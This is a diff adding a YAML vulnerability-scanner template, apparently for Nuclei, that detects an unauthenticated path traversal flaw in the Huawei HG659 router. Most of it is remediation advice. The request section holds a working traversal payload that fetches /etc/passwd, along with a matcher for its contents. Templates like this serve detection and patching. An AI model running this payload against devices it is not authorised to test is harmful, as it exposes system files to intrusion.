@@ -1,0 +1,27 @@
+id: huawei-hg659-lfi
+info:
+  name: HUAWEI HG659 LFI
+  author:
+  - l0ne1y
+  description: |-
+    HUAWEI HG659 directory traversal vulnerability
+    HUAWEI HG659 contains a path traversal vulnerability caused by the program's failure to adequately validate incoming HTTP requests. A remote attacker can exploit this vulnerability to access local files on the device without authentication.
+  severity: medium
+  remediation: "Official remedy:\n1. It is recommended that users obtain the latest patch or the latest version program from the official website:\nhttp://www.huawei.com/\n\nTemporary remedy:\n1. Defense at the system development stage: during development, system security should be fully considered. For directory traversal vulnerabilities, the content submitted by users must be strictly filtered, mainly filtering directory traversal symbols, character truncation symbols, the dir command, and so on.\n2. Defense at the system operation stage: system operators need strong security awareness, as their actions affect users' personal privacy and information security. For system operators, after deploying a new business system or installing new software or applications, they should use web scanning tools to actively check whether the system has a directory traversal vulnerability, and avoid installing third-party software unrelated to business on the server as much as possible to avoid introducing directory traversal vulnerabilities. In addition, the web server should be properly configured (disable directory browsing, assign directory permissions, etc.), and the release situation of the software and applications in use should be actively monitored, upgrading to new versions in a timely manner.\n3. Server configuration: to better protect system security, the production environment and the test/development environment should be isolated. Any change to the production environment must strictly follow the change management process, recording the operator, execution time, object, and specific changes, with prior review and post-audit by the enterprise information security department. Technical staff generally should not debug the production system directly; they can finish debugging in the test environment before updating the production system, to avoid security risks caused by enabling certain interfaces, changing certain configurations, or saving certain debug information during debugging. If it is necessary to debug the production system online and save debug information, avoid saving debug information directly to the local server, and delete the relevant debug information and restore the system configuration as soon as debugging is complete.\n
+    \ 1) IIS: open IIS Manager, navigate to the level you want to manage; in the \"Feature View\", double-click \"Directory Browsing\"; in the \"Actions\" pane, select the \"Directory Browsing\" feature and click \"Disable\".\n
+    \ 2) Nginx: find \"autoindex\" in the Nginx configuration file, set it to \"off\", then restart Nginx.\n  3) Apache: modify the httpd.conf configuration file, changing: Options
+    Indexes FollowSymLinks to: Options -Indexes FollowSymLinks, then restart Apache.\n  4) Tomcat: find the web.xml configuration file in the application's WEB-INF directory, set the initial value of the \"listings\" parameter to \"false\", then restart Tomcat.
+    \ \n4. Defense via security devices: when carrying out directory traversal attacks, attackers basically use directory traversal symbols, possibly combined with character truncation symbols, the dir command, and so on. For professional security devices, detecting directory traversal symbols, character truncation symbols, and commands related to viewing directories under specific syntax can identify various directory traversal attacks. Deploying professional security devices can not only well protect the business system's own directory traversal vulnerabilities, but also defend against directory traversal attacks caused by web servers and other third-party application vulnerabilities unrelated to business on the server."
+requests:
+- matchers:
+  - type: regex
+    condition: and
+    regex:
+    - 'root:.*:0:0:'
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/lib///....//....//....//....//....//....//....//....//etc//passwd'
+  method: GET
